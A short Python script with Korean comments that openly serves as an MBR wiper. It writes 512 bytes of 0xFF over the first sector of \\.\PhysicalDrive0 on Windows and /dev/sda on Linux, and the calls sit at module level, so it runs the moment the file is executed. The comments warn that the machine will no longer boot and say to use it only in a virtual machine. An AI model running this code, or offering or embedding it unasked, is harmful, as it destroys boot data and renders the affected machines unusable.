# 본 프로그램은 MBR(Master Boot Recoder)를 FF로 완전히 덮어씁니다.
# 따라서 부팅이 불가능해지며, 실제 실행은 절대 시도하지 마십시오.
# 실행은 가상머신이나 독립된 컴퓨터에서 실행하십시오.
#
#
# ===============================!본 프로그램을 절대 매인PC에서 실행시키지 마십시오.!===============================




# ===============================윈도우===============================
def modify_mbr_windows(disk_path):
    with open(disk_path, 'r+b') as disk:
        disk.write(bytes([0xFF] * 512))
modify_mbr_windows(r'\\.\PhysicalDrive0')

# ===============================리눅스===============================
def modify_mbr_linux(disk_path):
    with open(disk_path, 'r+b') as disk:
        disk.write(bytes([0xFF] * 512))
modify_mbr_linux('/dev/sda')
